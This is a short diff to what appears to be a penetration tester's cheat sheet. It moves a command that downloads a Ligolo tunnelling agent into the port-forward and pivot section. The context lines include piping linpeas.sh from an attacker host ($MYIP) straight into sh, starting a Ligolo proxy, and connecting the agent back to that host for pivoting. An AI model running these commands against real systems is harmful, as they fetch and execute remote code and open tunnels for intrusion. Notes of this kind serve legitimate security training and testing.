@@ -1435,6 +1435,7 @@ scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 13
 ## Ligolo - Port Forward and Pivot
 -->> New Configuration
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
+curl http://$MYIP:139/linux/agent -o agent
 chmod +x agent;
 ./agent -ignore-cert -connect $MYIP:443
 session
@@ -1488,8 +1489,6 @@ export PATH=/dev/shm:$PATH
 [*] File Transfer
 curl -s http://$MYIP:139/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:139/linux/linpeas.sh | sh
-curl http://$MYIP:139/linux/agent -o agent
-wget http://$MYIP:139/linux/agent -O agent
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
